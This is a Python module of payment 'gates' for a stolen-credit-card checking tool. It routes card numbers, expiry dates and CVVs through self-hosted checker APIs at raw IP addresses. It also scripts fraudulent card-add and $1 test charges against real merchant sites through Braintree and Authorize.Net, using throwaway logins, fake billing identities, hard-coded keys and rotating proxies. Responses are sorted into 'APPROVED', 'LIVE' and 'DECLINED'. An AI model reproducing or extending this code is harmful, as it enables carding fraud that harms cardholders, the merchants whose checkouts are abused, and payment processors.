#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import re
import random
import base64
import time
import urllib3
import logging
import hashlib
from functools import wraps

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# API ENDPOINTS
# ============================================================================
SHOPIFY_API_ENDPOINT = "http://2.25.156.218:5002/shopify"
CARD_API_BASE        = "http://2.25.156.218:5001"   # for Stripe Charge, PayPal, VBV, Braintree
RAZORPAY_API_URL     = "http://2.25.156.218:5000/check"
RAZORPAY_API_KEY     = "Novaop"

# ============================================================================
# DECORATORS (only kept on direct‑play gates)
# ============================================================================
def with_retries(max_attempts=3):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            last_error = None
            for attempt in range(max_attempts):
                try:
                    result = func(*args, **kwargs)
                    if isinstance(result, tuple) and len(result) == 2:
                        msg, status = result
                        if status == "ERROR":
                            error_keywords = [
                                "proxy error", "503", "service unavailable",
                                "server disconnected", "timeout", "connection refused",
                                "failed to get session token", "site error! status: 402",
                                "error processing card", "api error", "not shopify",
                                "proxy error: 503", "remote end closed",
                                "could not connect", "no route to host",
                                "unable to reach the checker"
                            ]
                            if any(kw in msg.lower() for kw in error_keywords):
                                last_error = msg
                                time.sleep(1)
                                continue
                    return result
                except Exception as e:
                    last_error = str(e)
                    time.sleep(1)
                    continue
            if last_error:
                return (f"Proxy retry exhausted: {last_error[:80]}", "ERROR")
            return result
        return wrapper
    return decorator

# ============================================================================
# CORE SELF‑API CALLER (for Stripe Charge, PayPal, VBV, Braintree) – 60s timeout
# ============================================================================
def _call_self_api(endpoint, cc, proxies=None):
    params = {'cc': cc}
    if proxies:
        if isinstance(proxies, (list, tuple)):
            params['proxy'] = ','.join(proxies)
        else:
            params['proxy'] = proxies

    url = f"{CARD_API_BASE}/{endpoint}"
    headers = {"X-API-Key": "novaop"}

    try:
        resp = requests.get(url, params=params, headers=headers, timeout=60, verify=False)
        resp.raise_for_status()
        data = resp.json()

        is_success = data.get('status', False)
        raw_msg    = data.get('message', 'Unknown')

        if is_success:
            if 'LIVE' in raw_msg.upper() or '3DS' in raw_msg.upper() or 'CVV' in raw_msg.upper():
                status = 'APPROVED'
            else:
                status = 'APPROVED'
        else:
            status = 'DECLINED'

        return raw_msg, status

    except Exception:
        return "API Error: Unable to reach the checker", "ERROR"

# ============================================================================
# STRIPE AUTH (B3) – DIRECT CALL, 60s TIMEOUT
# ============================================================================
def check_stripe_auth(cc, proxy=None):
    """Stripe Auth using the new self‑hosted API (port 5001)."""
    url = f"{CARD_API_BASE}/stripe_auth"
    headers = {"X-API-Key": "novaop"}
    params = {'cc': cc}

    try:
        resp = requests.get(url, params=params, headers=headers, timeout=60, verify=False)
        resp.raise_for_status()
        data = resp.json()

        is_success = data.get('status', False)
        raw_msg    = data.get('message', 'Unknown')

        if is_success:
            return raw_msg, "APPROVED"
        else:
            if any(kw in raw_msg.upper() for kw in ['DECLINED', 'INSUFFICIENT', 'CARD', 'FUNDS']):
                return raw_msg, "DECLINED"
            return raw_msg, "DECLINED"
    except Exception as e:
        return f"Stripe Auth error: {str(e)}", "ERROR"

# ============================================================================
# STRIPE CHARGE – 60s via _call_self_api
# ============================================================================
def check_stripe_charge(cc, proxy=None):
    return _call_self_api('stripe_charge', cc, proxies=proxy)

# ============================================================================
# PAYPAL – 60s via _call_self_api
# ============================================================================
def check_paypal(cc, proxy=None):
    raw_msg, api_status = _call_self_api('paypal', cc, proxies=proxy)
    if "LIVE" in raw_msg.upper() or "CHARGED" in raw_msg.upper():
        return raw_msg, "APPROVED"
    return raw_msg, api_status

check_paypal_charge = check_paypal
check_paypal_donate = check_paypal
check_paypal_fixed   = check_paypal
check_paypal_general = check_paypal
check_paypal_onyx    = check_paypal

# ============================================================================
# VBV / 3DS – 60s via _call_self_api
# ============================================================================
def check_vbv_lookup(cc, proxy=None):
    return _call_self_api('vbv_lookup', cc, proxies=proxy)

# ============================================================================
# BRAINTREE AUTH – 60s via _call_self_api
# ============================================================================
def check_braintree_api(cc, proxy=None):
    return _call_self_api('braintree_auth', cc, proxies=proxy)

# ============================================================================
# BRAINTREE B3 (direct) – kept retries, internal requests 15s each
# ============================================================================
@with_retries(max_attempts=3)
def check_braintree_b3(cc, proxy=None):
    parts = cc.strip().split("|")
    if len(parts) != 4:
        return "Invalid card format", "ERROR"
    n, mm, yy, cvc = parts
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = "20" + yy
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    proxy_url = normalise_proxy(proxy)
    try:
        s = requests.Session()
        if proxy_url:
            s.proxies = {'http': proxy_url, 'https': proxy_url}
        resp = s.get('https://unclejimswormfarm.com/my-account/', headers={'User-Agent': ua}, timeout=60)
        login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', resp.text).group(1)
        login_data = f'username=shamon843738@gmail.com&password=shamon843738@gmail.com&woocommerce-login-nonce={login_nonce}&_wp_http_referer=%2Fmy-account%2F&login=Log+in'
        s.post('https://unclejimswormfarm.com/my-account/', data=login_data, headers={
            'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua,
        }, timeout=60)
        resp = s.get('https://unclejimswormfarm.com/my-account/add-payment-method/', headers={'User-Agent': ua}, timeout=60)
        payment_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text).group(1)
        b_token_enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', resp.text).group(1)
        b_token = base64.b64decode(b_token_enc).decode()
        auth_fingerprint = re.search(r'"authorizationFingerprint":"(.*?)"', b_token).group(1)
        merchant_id = re.search(r'merchantId":"(.*?)"', b_token).group(1)
        gql_data = {
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": n,
                        "expirationMonth": mm,
                        "expirationYear": yy[-2:],
                        "cvv": cvc,
                        "billingAddress": {"postalCode": "10010", "streetAddress": "5875 South Aviation Avenue"}
                    },
                    "options": {"validate": False}
                }
            }
        }
        resp = s.post('https://payments.braintree-api.com/graphql', json=gql_data, headers={
            'Authorization': f'Bearer {auth_fingerprint}',
            'Braintree-Version': '2018-05-10',
            'Content-Type': 'application/json',
            'User-Agent': ua,
        }, timeout=60)
        token = re.search(r'"token":"(.*?)"', resp.text).group(1)
        if not token:
            return "Tokenization failed", "ERROR"
        add_data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': f'{{"environment":"production","merchantId":"{merchant_id}"}}',
            'woocommerce-add-payment-method-nonce': payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        resp = s.post('https://unclejimswormfarm.com/my-account/add-payment-method/', data=add_data, headers={
            'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua,
        }, timeout=60)
        if "Payment method successfully added" in resp.text or "New payment method added" in resp.text:
            return "Card added (Auth OK)", "APPROVED"
        if "woocommerce-error" in resp.text:
            err = re.search(r'<ul class="woocommerce-error">\s*<li>\s*(.*?)\s*</li>', resp.text, re.DOTALL)
            reason = err.group(1).strip() if err else "Declined"
            return f"DECLINED: {reason}", "DECLINED"
        return "Unknown response", "ERROR"
    except Exception as e:
        return f"Braintree error: {str(e)[:80]}", "ERROR"

# ============================================================================
# SHOPIFY API – 60s
# ============================================================================
def check_shopify_api(site_url, cc, proxy=None):
    params = {'site': site_url, 'cc': cc}
    if proxy:
        params['proxy'] = proxy
    try:
        resp = requests.get(SHOPIFY_API_ENDPOINT, params=params, timeout=60, verify=False)
        resp.raise_for_status()
        data = resp.json()
        msg = data.get('Response', 'Unknown')
        gateway = data.get('Gateway', 'Shopify Payments')
        price = str(data.get('Price', '0.00'))
        api_status = data.get('Status', False)
        msg_upper = msg.upper()
        DECLINE_KEYWORDS = [
            'PROCESSING_ERROR', 'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED',
            'PAYMENTS_CREDIT_CARD_GENERIC', 'GENERIC_DECLINE',
            'DO_NOT_HONOR', 'INSUFFICIENT_FUNDS', 'CARD_DECLINED',
            'FRAUD_SUSPECTED', 'INCORRECT_CVC', 'INCORRECT_ZIP',
            'EXPIRED_CARD', 'INVALID_ACCOUNT', 'RESTRICTED_CARD',
            'LOST_CARD', 'STOLEN_CARD', 'PICKUP_CARD'
        ]
        if any(kw in msg_upper for kw in DECLINE_KEYWORDS):
            return {
                'Response': msg,
                'status': 'DECLINED',
                'gateway': gateway,
                'price': price,
                'site': site_url
            }
        if 'ORDER_PLACED' in msg_upper or 'APPROVED' in msg_upper:
            status = 'APPROVED'
        elif 'OTP' in msg_upper or '3D' in msg_upper:
            status = 'APPROVED_OTP'
        elif 'DECLINED' in msg_upper:
            status = 'DECLINED'
        elif not api_status:
            status = 'ERROR'
        else:
            status = 'DECLINED'
        return {
            'Response': msg,
            'status': status,
            'gateway': gateway,
            'price': price,
            'site': site_url
        }
    except Exception:
        return {
            'Response': 'API Error',
            'status': 'ERROR',
            'gateway': 'Shopify',
            'price': '0.00',
            'site': site_url
        }

def process_shopify_api_response(api_response, site_price='0.00'):
    if not api_response or not isinstance(api_response, dict):
        return "System Error", "ERROR", "Shopify Payments"
    msg = api_response.get('Response', 'Unknown')
    status = api_response.get('status', 'ERROR')
    gateway = api_response.get('gateway', 'Shopify Payments')
    return msg, status, gateway

# ============================================================================
# AUTHORIZE.NET – internal requests 60s
# ============================================================================
@with_retries(max_attempts=3)
def check_authorize_net(cc, proxy=None):
    parts = cc.strip().split("|")
    if len(parts) != 4:
        return "Invalid card format", "ERROR"
    n, mm, yy, cvc = parts
    mm = mm.zfill(2)
    if "20" in yy:
        yy = yy.split("20")[1]
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    proxy_url = normalise_proxy(proxy)
    try:
        s = requests.Session()
        if proxy_url:
            s.proxies = {'http': proxy_url, 'https': proxy_url}
        token_url = 'https://api2.authorize.net/xml/v1/request.api'
        token_data = {
            "securePaymentContainerRequest": {
                "merchantAuthentication": {
                    "name": "3q85aDr4SN9t",
                    "clientKey": "224BvW2FU79Fuzx86cxGMFpsdU3Bc7cqA9cvx64u6XXD5y6qTFmhFEHGF8Dhu6tC"
                },
                "data": {
                    "type": "TOKEN",
                    "id": "da6eaa1f-2da0-9a00-ad1b-b9ff572a19a4",
                    "token": {
                        "cardNumber": n,
                        "expirationDate": f"20{yy}-{mm}",
                        "cardCode": cvc,
                        "zip": "58104",
                        "fullName": "Mr perfect"
                    }
                }
            }
        }
        resp = s.post(token_url, json=token_data, headers={
            'Accept': '*/*', 'Content-Type': 'application/json',
            'Origin': 'https://www.bomaphila.com', 'User-Agent': ua,
        }, timeout=60)
        token = resp.json().get('opaqueData', {}).get('dataValue')
        if not token:
            return "Tokenization failed", "ERROR"
        form_resp = s.get('https://api.membershipworks.com/v2/form?ttl=Invoices',
                          headers={'accept': 'application/json', 'user-agent': ua, 'x-org': '29723'}, timeout=60)
        form_id = form_resp.json().get('fid')
        if not form_id:
            return "Form ID not found", "ERROR"
        checkout_url = f'https://api.membershipworks.com/v2/form/{form_id}/checkout'
        fields = {
            'nam': 'Mr perfect', 'xni': 'Mr perfect', 'eml': 'mrperfectxyct@gmail.com',
            'phn': '06534235789', 'xin': '3453452q', 'xvn': '43523452',
            'crd[nam]': 'Mr perfect ', 'crd[ad1]': '145 Marco street',
            'crd[cot]': 'Cass County', 'crd[sta]': 'ND', 'crd[con]': 'US',
            'crd[zip]': '58104', 'crd[cit]': 'Fargo', 'crd[loc][0]': '-96.8054856',
            'crd[loc][1]': '46.8213838', 'crd[tok]': token, 'sum': '100',
            'itm[0][_id]': '63b85320ab1e2e42be3eab83', 'itm[0][amt]': '100', 'itm[0][qty]': '1',
        }
        boundary = '----WebKitFormBoundaryz7wbnClCdUKdtQ5n'
        body = ''
        for name, value in fields.items():
            body += f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'
        body += f'--{boundary}--\r\n'
        resp = s.post(checkout_url, data=body.encode('utf-8'), headers={
            'accept': 'application/json',
            'content-type': f'multipart/form-data; boundary={boundary}',
            'origin': 'https://www.bomaphila.com', 'referer': 'https://www.bomaphila.com/',
            'user-agent': ua, 'x-org': '29723',
        }, timeout=60)
        result = resp.text.lower()
        if 'approved' in result or 'success' in result:
            return "CHARGE $1.00", "APPROVED"
        if 'insufficient' in result:
            return "INSUFFICIENT FUNDS", "APPROVED"
        if 'declined' in result:
            return "DECLINED", "DECLINED"
        return f"Unknown response: {resp.text[:50]}", "ERROR"
    except Exception as e:
        return f"Authorize.Net error: {str(e)[:80]}", "ERROR"

# ============================================================================
# RAZORPAY – 60s
# ============================================================================
def check_razorpay(cc, proxy=None, site=None):
    if not site:
        return "No site provided. Use /addrz to add sites and /mrz for mass check.", "ERROR"
    site_id = hashlib.md5(site.encode()).hexdigest()[:5]
    params = {'cc': cc, 'site': site}
    if proxy:
        params['proxy'] = proxy
    headers = {"X-API-Key": RAZORPAY_API_KEY}
    try:
        resp = requests.get(RAZORPAY_API_URL, params=params, headers=headers, timeout=60, verify=False)
        if resp.status_code != 200:
            return f"API error (HTTP {resp.status_code}) [ID: {site_id}]", "ERROR"
        data = resp.json()
        if 'error' in data:
            return f"Error: {data['error']} [ID: {site_id}]", "ERROR"
        status = data.get('status')
        response = data.get('response', '')
        if status == 'approved' or status == 'charged':
            return f"APPROVED – {response} [ID: {site_id}]", "APPROVED"
        elif status == 'declined':
            return f"DECLINED – {response} [ID: {site_id}]", "DECLINED"
        else:
            return f"Unknown – {response} [ID: {site_id}]", "ERROR"
    except requests.exceptions.ConnectionError:
        return f"Razorpay API unreachable [ID: {site_id}]", "ERROR"
    except Exception as e:
        return f"Razorpay API error: {str(e)[:40]} [ID: {site_id}]", "ERROR"

check_razorpay_api = check_razorpay

# ============================================================================
# MIDASBUY – 60s
# ============================================================================
MIDASBUY_API = "http://72.62.16.52:8080/check"

@with_retries(max_attempts=3)
def check_midasbuy(cc, proxy=None):
    try:
        params = {'cc': cc}
        resp = requests.get(MIDASBUY_API, params=params, timeout=60, verify=False)
        resp.raise_for_status()
        data = resp.json()
        if 'response' in data:
            inner = data['response']
            result = inner.get('result', None)
            msg   = inner.get('message', 'unknown')
            if result == 0 or 'success' in msg.lower() or 'approved' in msg.lower():
                return f"APPROVED – {msg}", "APPROVED"
            elif '3d' in msg.lower() or 'otp' in msg.lower() or 'action' in msg.lower():
                return f"LIVE (3DS Required) – {msg}", "APPROVED"
            elif 'insufficient' in msg.lower():
                return f"LIVE (Insufficient) – {msg}", "APPROVED"
            else:
                return f"DECLINED – {msg}", "DECLINED"
        else:
            return f"Unknown response: {json.dumps(data)[:100]}", "ERROR"
    except Exception as e:
        return f"Midasbuy Error: {str(e)[:60]}", "ERROR"

# ============================================================================
# PROXY NORMALISATION
# ============================================================================
def normalise_proxy(proxy):
    if not proxy:
        return None
    if proxy.startswith('http://') or proxy.startswith('https://'):
        return proxy
    return f'http://{proxy}'

# ============================================================================
# ALIASES
# ============================================================================
check_stripe_api = check_stripe_charge
check_b3_auth    = check_stripe_auth
check_vbv        = check_vbv_lookup
check_braintree  = check_braintree_api

check_razor      = check_razorpay
check_midas      = check_midasbuy
check_rz         = check_razorpay
check_stripe5    = check_stripe_charge

# Fallback gates (Shopify)
def shopify_check(cc, proxy=None):
    FALLBACK_SITES = [
        "https://bb73c3-5.myshopify.com",
        "https://travelerchoicetravelware.myshopify.com",
    ]
    site = random.choice(FALLBACK_SITES)
    resp = check_shopify_api(site, cc, proxy)
    msg, status, _ = process_shopify_api_response(resp)
    return msg, status

check_chaos          = shopify_check
check_adyen          = shopify_check
check_app_auth       = shopify_check
check_stripe_onyx    = check_stripe_auth
check_arcenus        = shopify_check
check_stripe_working = check_stripe_auth
check_payflow        = shopify_check
check_random         = shopify_check
check_shopify_onyx   = shopify_check
check_skrill         = shopify_check
check_random_stripe  = check_stripe_auth
check_payu           = shopify_check
check_sk_gateway     = shopify_check
